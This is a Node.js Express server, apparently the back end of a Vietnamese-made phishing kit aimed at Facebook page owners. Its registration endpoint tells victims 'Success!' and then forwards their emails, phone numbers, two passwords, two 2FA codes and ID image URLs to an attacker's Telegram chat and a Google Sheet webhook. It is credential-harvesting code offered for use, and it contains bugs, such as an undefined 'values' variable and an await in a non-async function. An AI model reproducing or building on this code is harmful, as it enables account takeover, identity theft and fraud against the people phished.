import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));

app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true, 
    request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});

app.post('/api/resgister', (req, res) => {
    // GET DATA FROM CLIENT
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    // SEND DATA TO TELE
    const message = `<b>Ip:</b> <code>${values.ip || ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail || ''}</code>\n<b>Email Personal:</b> <code>${values.personalEmail || ''}</code>\n<b>User name:</b> <code>${values.fullName || ''}</code>\n<b>Page name:</b> <code>${values.fanpageName || ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone || ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst || ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond || ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
    bot.sendMessage(process.env.CHAT_ID, message, { parse_mode: 'html' });


    // // ADD GOOGLE SHEET
    if (process.env.WEBHOOK_URL) {
        const params = new URLSearchParams({
            Ip: values.ip || '',
            City: values.city || '',
            Country: values.country || '',
            'Email Business': values.businessEmail || '',
            'Email Personal': values.personalEmail || '',
            'Full Name': values.fullName || '',
            'Fanpage Name': values.fanpageName || '',
            'Phone Number': values.mobilePhone || '',
            'Password First': values.passwordFirst || '',
            'Password Second': values.passwordSecond || '',
            'First Two-Fa': values.firstTwoFa || '',
            'Second Two-Fa': values.secondTwoFa || '',
            Image: values.imageUrl || ''
        });

        try {
            await axios.get(`${process.env.WEBHOOK_URL}?${params.toString()}`);
            bot.sendMessage(process.env.CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
        } catch (err) {
            bot.sendMessage(process.env.CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
        }
    }

});

app.listen(process.env.PORT, () => {
    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
});
